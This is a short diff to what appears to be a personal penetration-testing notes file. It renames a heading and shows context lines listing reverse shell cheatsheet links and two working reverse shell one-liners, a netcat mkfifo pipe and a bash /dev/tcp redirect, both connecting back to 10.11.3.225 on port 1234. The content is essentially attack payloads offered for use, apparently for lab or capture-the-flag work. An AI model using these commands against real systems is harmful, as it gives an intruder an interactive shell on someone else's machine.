@@ -4,7 +4,7 @@
 https://www.revshells.com/  
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php  
 
-### Reverse non interactive shell basic payload
+### Reverse shell basic payloads
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.3.225 1234 >/tmp/f
 bash -i >& /dev/tcp/10.11.3.225/1234 0>&1
